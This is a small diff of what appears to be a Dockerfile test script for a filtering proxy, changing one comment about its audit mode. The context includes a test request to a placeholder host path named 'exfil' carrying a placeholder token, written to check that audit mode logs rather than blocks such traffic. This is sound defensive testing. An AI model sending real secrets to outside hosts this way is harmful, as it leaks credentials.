@@ -40,7 +40,7 @@ RUN echo "=== [TLS on 9443] ===" && \
     echo "$OUT" && \
     case "$OUT" in PRIVATE\ GET*) echo "OK" ;; *) echo "FAILED" && exit 1 ;; esac
 
-# audit refuses nothing, so this reaches the origin and is recorded rather than
+# audit blocks nothing, so this reaches the origin and is recorded rather than
 # being turned into a 403.
 RUN echo "=== [Would-be-blocked host] ===" && \
     OUT=$($S "https://blocked.example.com/exfil?token=SECRET-VALUE") && \
